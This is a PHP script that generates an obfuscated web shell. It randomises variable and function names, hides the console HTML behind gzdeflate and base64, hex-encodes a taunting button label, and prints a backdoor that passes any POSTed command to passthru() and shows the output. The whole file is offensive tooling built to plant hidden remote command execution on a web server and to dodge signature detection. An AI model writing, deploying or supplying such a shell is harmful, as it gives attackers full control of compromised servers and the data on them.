<?php
//; exit 1      # in case you did ./rand.php

// are we running from a webserver or terminal?
if ( ! isset($_SERVER['TERM'])){
    header('Content-Type: text/plain');
}

function make_random_name(){
    // making some randomness
    $name = rand() * rand();
    $name = hash("whirlpool", $name);
    $name = crypt($name, rand());

    // shorten, rm leading numbers
    $name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
    $name = preg_replace('/^[0-9]+/', '', $name);

    // make sure the regex didn't leave us an empty string
    return ($name = NULL? make_random_name(): $name);
}

$eval_function    = make_random_name();
$eval_arg         = make_random_name();
$html_console_tag = make_random_name();
$post_param       = make_random_name();
$post_command     = make_random_name();
$script_name      = make_random_name();
$page_html_var    = make_random_name();

$page_html = <<< EOF
<html>
    <head>
        <style>
            input{ background-color: rgb(255, 255, 255); width: 100%;}
            * { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
            body{ background-color: rgb(250, 250, 250);}
            $html_console_tag{ color: rgb(170, 170, 170);}
        </style>
    </head>
    <body>
        <form action="$script_name" id="form" method="POST">
            <input type="text" name="$post_param" autocomplete="off" autofocus>
            <button type="submit">&#x7E;&#x20;&#x66;&#x55;&#x71;&#x31;&#x4E;&#x20;&#x68;&#x34;&#x51;&#x20;&#x74;&#x68;&#x31;&#x7A;&#x5A;&#x5A;&#x7A;&#x20;&#x62;&#x28;&#x29;&#x78;&#x20;&#x7E;</button>
        </form>
    <code>
<pre>
EOF;

$page_html = base64_encode(gzdeflate($page_html));


$shell = <<< EOF
<?php

\$$page_html_var = gzinflate(base64_decode("$page_html"));

function $eval_function(\$$eval_arg){
    echo "<$html_console_tag>\$ ".\$$eval_arg."</$html_console_tag><br>";
    echo htmlentities(passthru(\$$eval_arg." 2>&1"));
}
echo preg_replace("/$script_name/", basename(\$_SERVER["SCRIPT_NAME"]), \$$page_html_var);

if (isset(\$_POST["$post_param"])){
    $eval_function(\$_POST["$post_param"]);
}
else {
    $eval_function("#");
}
__halt_compiler/*
*/();
EOF;

echo $shell;

?>